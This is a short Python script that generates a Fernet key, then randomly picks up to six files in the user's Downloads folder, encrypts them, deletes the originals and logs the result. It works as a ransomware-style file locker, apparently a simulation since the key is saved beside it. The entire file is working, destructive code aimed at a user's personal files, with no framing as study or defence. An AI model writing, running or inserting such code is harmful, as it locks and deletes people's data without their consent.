import os
import random
import logging
from cryptography.fernet import Fernet

# lets strart by generating an encryption key
def generate_key():
    key = Fernet.generate_key()
    with open('encryption_key.key', 'wb') as key_file:
        key_file.write(key)
    print("Key generated and saved to 'encryption_key.key")
    return key

def encrypt_file(file_path, encrypted_folder, cipher_suite):
    # read the file content and encrypt it
    try:
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        encrypted_data = cipher_suite.encrypt(plaintext)
        encrypted_file_path = os.path.join(encrypted_folder, os.path.basename(file_path) + '.encrypted')
        with open(encrypted_file_path, 'wb') as f:
            f.write(encrypted_data)
        os.remove(file_path)
        print(f"File encrypted and moved: {file_path} to {encrypted_file_path}")
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {e}")

def select_and_encrypt_files(folder_path, num_files=6):
    # select random files from the folder and encrypt them
    key = generate_key()
    cipher_suite = Fernet(key)
    noname_directory = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
    log_directory = os.path.join(noname_directory, 'logs')

    if not os.path.exists(log_directory):
        os.makedirs(log_directory)
    log_file = os.path.join(log_directory, 'encryption_log.log')
    logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    try:
        all_files = [os.path.join(folder_path, f) for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
        selected_files = random.sample(all_files, min(len(all_files), num_files))
        encrypted_folder = os.path.join(folder_path, 'encrypted')
        if not os.path.exists(encrypted_folder):
            os.makedirs(encrypted_folder)

        for file_path in selected_files:
            encrypt_file(file_path, encrypted_folder, cipher_suite)
        logging.info(f"Selected and encrypted {len(selected_files)} files.")
        print(f"Selected and encrypted {len(selected_files)} files.")
    except Exception as e:
        logging.error(f"Failed to select or encrypt files: {e}")
        print(f"Failed to select or encrypt files: {e}")

if __name__ == "__main__":
    # encrypt files in the Downloads folder
    try:
        downloads_folder = os.path.expanduser("~/Downloads")
        select_and_encrypt_files(downloads_folder)
    except Exception as e:
        print(f"Failed to encrypt files: {e}")
